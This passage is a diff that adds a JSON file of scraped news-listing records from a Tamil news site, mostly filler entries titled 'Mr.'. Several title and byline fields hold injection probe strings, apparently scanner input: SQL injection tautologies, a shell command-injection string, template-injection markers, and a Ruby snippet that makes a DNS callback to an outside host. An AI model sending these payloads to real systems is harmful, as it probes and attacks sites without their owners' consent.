@@ -1,0 +1,3068 @@
+{
+  "adaderana-sinhala": {
+    "success": false,
+    "error": {}
+  },
+  "adaderana-tamil": {
+    "success": true,
+    "data": [
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=202546",
+        "byline": "555",
+        "timestamp": "August 3, 2025  12:53 am",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=202546",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "d60a8c4dcbe0acb14866ffb1a3895a3f55a61d832dfd2d5dc6ac0bace8fcc869"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=202545",
+        "byline": "555",
+        "timestamp": "August 3, 2025  12:53 am",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=202545",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "1aa2d2b1965b8242423c9f4ce6612a5ded1ee507607f31aa284a40439cb02836"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201476",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:22 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201476",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "48a783f1783142c1ecdf151794c7785feb330b22dcad504308ecc9ba75fc0920"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201475",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:22 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201475",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "6fd5046093d718c6733549325cae945b2e09a8511bacf7800a876fc04e24a47e"
+      },
+      {
+        "title": "Mr.",
+        "href": "news.php?nid=200193",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:09 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=200193",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "d28c5c6c433f6da76e65689c1864c38e3287d53ae60eebffff7ef4a6a8997e5c"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201731",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:22 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201731",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "348065ead1726862ef29af19674a2a6ed75991e37ded5f43fde2d88f8df06738"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201221",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:21 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201221",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "ff70be84007b10646b54b0a574faf0c5ba40a0767710a257bbe4e0bfcf16dd23"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=202247",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:23 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=202247",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "4294134984cbea124fdc5e2f9c6072de624c62d04baeff51853cc0ce7ac716a3"
+      },
+      {
+        "title": "Mr.",
+        "href": "news.php?nid=200196",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:09 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=200196",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "c0437be944d3d2bc6ed42980c99019898107f3c814d67a611b17480b172a301e"
+      },
+      {
+        "title": "Mr.",
+        "href": "news.php?nid=200709",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:20 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=200709",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "01aa692d8e4b43932e61940190f69ee29f6309bb1ce138ee7a13e32e7586fa4c"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201984",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:23 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201984",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "0217d00b134ef96209bcb1f0d30f6839ba78f82ca115d140be4afa248e7fb48d"
+      },
+      {
+        "title": "Mr.",
+        "href": "news.php?nid=200451",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:14 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=200451",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "6112e2eb357a9ae1a1fea588193ea7e0b46261e1bcdf7ff4451d265f6bf176e0"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201472",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:22 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201472",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "fb57237bfcf798dd9b636423087be9bf3167160c16a0cf9db2f20782c91528a4"
+      },
+      {
+        "title": "Mr.",
+        "href": "news.php?nid=200453",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:14 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=200453",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "f1d8a7e42970354ed17cbf12bce05943b9bb0da1cea2d78fab0e892bf3b797b7"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=202243",
+        "byline": "-1' OR 5*5=25 or 'yYkgJ0rT'='",
+        "timestamp": "August 2, 2025  8:23 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=202243",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "8a9b251f443428773ff243a0396675df183cb3122233c0156defdec4a1306d56"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201222",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:21 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201222",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "fec1c337d4cc197c60d5f1a97969b58ec6faee2b65a4b0e428766ddb5d7e0308"
+      },
+      {
+        "title": "Mr.",
+        "href": "news.php?nid=200448",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:13 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=200448",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "7c2631bf6c2d6d5a0d084a0d376f6a7d3558ce21cc42e974605ba97965e239a0"
+      },
+      {
+        "title": "Mr.",
+        "href": "news.php?nid=201987",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:23 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=201987",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "9c63897961fbe245a54af5f97b1b50461f7dc0af07359b448925d691b1504ae7"
+      },
+      {
+        "title": "Mr.",
+        "href": "news.php?nid=201993",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:23 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=201993",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "7bfe1ddd04b28823c6a4e8cd505831ff9350c3a48fa4928c70b1d129428014ef"
+      },
+      {
+        "title": "Mr.",
+        "href": "news.php?nid=200201",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:09 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=200201",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "c51c8fc95cd9eff51b1424959025b692072b68a881041cee63538e53644f02ad"
+      },
+      {
+        "title": "Mr.",
+        "href": "news.php?nid=200454",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:14 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=200454",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "342137465c1ef447e2aec184cbf6f4c39e17117ad952d73e6d0c3ec4dd2a3954"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=202241",
+        "byline": "-1\" OR 5*5=25 --",
+        "timestamp": "August 2, 2025  8:23 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=202241",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "f90a541ca53908c0791f27c8c271538364a780fed6317a2bca70d057603146f2"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201480",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:22 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201480",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "10c8f8e3338f8f30ed2595c20eeb9a1874e886ed7f6283962333f196b8df77f1"
+      },
+      {
+        "title": "expr 9000728487 - 946421",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201735",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:22 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201735",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "70c50ed351d804ed59f005bb81c29644bcf2e80d56ae10d1cb975f18537afd0a"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=202496",
+        "byline": "(select 198766*667891 from DUAL)",
+        "timestamp": "August 2, 2025  8:24 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=202496",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "6522887169d4716cfc7cc0a017e57768936384830a7127b80a6634da89ad15f0"
+      },
+      {
+        "title": "|echo smsmga$()\\ klcaaz\\nz^xyu||a #' |echo smsmga$()\\ klcaaz\\nz^xyu||a #|\" |echo smsmga$()\\ klcaaz\\nz^xyu||a #",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201728",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:22 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201728",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "ad16a6c1d6f0115fee29ed11edc74a01d8bbe29246ec67a2bd93e2349994de1a"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=202498",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:24 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=202498",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "eda3aa8c764a7bff253b911be11de3f1b3353dabc24d1057bcf8ccc7af9442a5"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=202242",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:23 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=202242",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "2d96f45577113aadf5dfbb7d8b3e148d6e1338fc56fdde472dfcfa9639f10ed5"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=202244",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:23 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=202244",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "63b6795d4d12b0b2ac04fc1d162bea709845388d53d4925ccb7d9a51efe8065b"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=202240",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:23 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=202240",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "f8bdbc60bfd8bc7bda525b526499399444081913a98680bb0b8072d08ff3ef07"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=200710",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:20 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=200710",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "72b6993d1b4812f61a6175bc3cb7149d3d7bd1187751d5bd464a8237248b820b"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201219",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:21 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201219",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "8562f48706bc855a3d1b31f721c7e3b527a1cd88f6698cf8b1a933cf298aeddf"
+      },
+      {
+        "title": "RoCyqhM1: XSPklfGk",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201729",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:22 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201729",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "1da039cff3b76ac75128c232365ef9afca543416140ecaa7e7edeef5198d5b22"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=202503",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:24 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=202503",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "9fd141a016a37395fea67c92fffca341a118cebb62c0f6057f91ea05927f3879"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201223",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:21 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201223",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "207672cf88ca62dd85cdf4ffe31ecc3d54aabcd3ada6f4ffc7ec4c5c146f9b58"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201737",
+        "byline": "AAABBBCCC{{define \"bla\"}}bla{{end}}{{define \"dfb\"}}xyz{{end}}{{template \"dfb\"}}CCCBBBAAA",
+        "timestamp": "August 2, 2025  8:22 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201737",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "558a265aa662e27092fbfb31a61a5a32cb4c339a0a815c587a2a24110f916a08"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=202248",
+        "byline": "-1\" OR 5*5=26 or \"y5Y1oQTd\"=\"",
+        "timestamp": "August 2, 2025  8:23 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=202248",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "88bafaf9e3ccd12f4089c851aeb8284fa7916976edaf5039552e3d12c5e9c79c"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201730",
+        "byline": "dfb#{xca}=123",
+        "timestamp": "August 2, 2025  8:22 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201730",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "1aa99ed2ca44e90ae1f45c5676b43e41d7658364823dcc9a7be1722aee910db7"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201478",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:22 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201478",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "19af221cab5519f5a98d968d3f9f1316f0cef1caeeaf8f2a9998347a6ff1266e"
+      },
+      {
+        "title": "'+'A'.concat(70-3).concat(22*4).concat(106).concat(68).concat(111).concat(74)+(require'socket'\nSocket.gethostbyname('hitmw'+'qznbphqp40856.bxss.me.')[3].to_s)+'",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201217",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:21 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201217",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "8fd679c222c32f78a2c2df133344c3e92a6955bf6750915f446d48bce4fd3751"
+      },
+      {
+        "title": "Mr.",
+        "href": "news.php?nid=200968",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:21 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=200968",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "4af6830ccb1ffcb494d0364af613fc93adfd6b75c8edf67f79a674820b2e6daa"
+      },
+      {
+        "title": "Mr.",
+        "href": "news.php?nid=200708",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:20 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=200708",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "8efe31b841eb2ccbd5d565c0922e4a76333676d48974107db8c8a6bc5561ec65"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=200969",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:21 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=200969",
+        "isoTimestamp": "2025-08-29T02:32:34+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "761f7bdd4eeb78f396464336e55cd6cce4116390e085247fd0b463394bb6609b"
+      },
+      {
+        "title": "Mr.",
+        "href": "news.php?nid=201990",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:23 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=201990",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "dbb7e9050a8bb8f82e64d1dd419dac6daff34f0afd45df69e72ef05a62a6ea05"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201733",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:22 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201733",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "52c1662671ba09c63e8baef279691fbf854e4a32d9ef15fe3477c04fc890c09e"
+      },
+      {
+        "title": "Mr.",
+        "href": "news.php?nid=200450",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:13 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=200450",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "3d17fae28e32a45185180fbe81c251056964b0418c1048729f1e71cb334ab036"
+      },
+      {
+        "title": "Mr.",
+        "href": "news.php?nid=200711",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:20 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=200711",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "db8e3e19a28618fa3f801b01d12c9c48fc60a3f46c4d8e8fa0ed4792cf172bf2"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=202500",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:24 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=202500",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "462648a90fbb2bf1ce2a02c6fac0b2c447518cab8e143b525538d12416fd542c"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201477",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:22 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201477",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "200e38e7d5347673915797c9f2b036f0dd88c2b51b35d83f07818ad1b021785a"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=202504",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:24 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=202504",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "4d4b72c3bdb9805b28d394f3a60eb15d1759516d3c121403f729f2bd8610a5d4"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=202246",
+        "byline": "-1\" OR 5*5=25 or \"y5Y1oQTd\"=\"",
+        "timestamp": "August 2, 2025  8:23 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=202246",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "ff3b1854cd4740483e439023ecee6c2e6d8481d511d1e801afd2bad9ea662e42"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201218",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:21 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201218",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "b7191957837f9380ae341157c5994f66c52ace5022c2e468bf61acb307da302c"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=200963",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:21 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=200963",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "c08467a205118ca3dd0a71dfd10fdc770d2169a20ed985caaae2fdb6619a32c2"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=200961",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:21 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=200961",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "199bead02a15e7a72e7f6e55466b883e6c606dcb553327b45de5f5bf1089d61e"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=202499",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:24 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=202499",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "f2a8d90c54f30e8e0cdbc5a83e4004d932c1fc0100ab850e4d52c3678435d142"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=200705",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:20 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=200705",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "f26da7b69523a1defeaccd820aa01332d83bc2be930fa97590dd3b99509dbdc0"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201989",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:23 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201989",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "f209dbdc85f0c3f8e4b34c6d9bd7325710c5794dc56b0a722ee265ccdb90ca57"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=201473",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:22 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=201473",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "6b1e846a8ea756239230c2669f6bb5c14c9252bb16b8b39ddd98cd91f1831d32"
+      },
+      {
+        "title": "Mr.",
+        "href": "cartoon/cartoonbasicdetails2.php?newsID=200962",
+        "byline": "'%}dfb{{98991*97996}}xca",
+        "timestamp": "August 2, 2025  8:21 pm",
+        "url": "https://tamil.adaderana.lk/cartoon/cartoonbasicdetails2.php?newsID=200962",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "5bb7a23e6b96dc2f899fa4c84fa31b8ffab1929bf7e6c41835d927f2b258eaa7"
+      },
+      {
+        "title": "Mr.",
+        "href": "news.php?nid=200455",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:14 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=200455",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "d01459adb09cf902ab92eaf2fc1da7eceeaa30954e5163d3059dbbe27694e592"
+      },
+      {
+        "title": "Mr.",
+        "href": "news.php?nid=200195",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:09 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=200195",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "b15769f067ac13a945f2ea3c3747a8efb5791ee2b98770dbdadaaedb0db45cf6"
+      },
+      {
+        "title": "Mr.",
+        "href": "news.php?nid=200706",
+        "byline": "555",
+        "timestamp": "August 2, 2025  8:20 pm",
+        "url": "https://tamil.adaderana.lk/news.php?nid=200706",
+        "isoTimestamp": "2025-08-29T02:32:35+05:30",
+        "baseUrl": "https://tamil.adaderana.lk",
+        "checkSum": "f4dede0b23ddd12f8b1f6e174307d3f7414f131fdbfecf9de8be615cb6a06ddb"
+      },
+      {
+        "title": "Mr.",
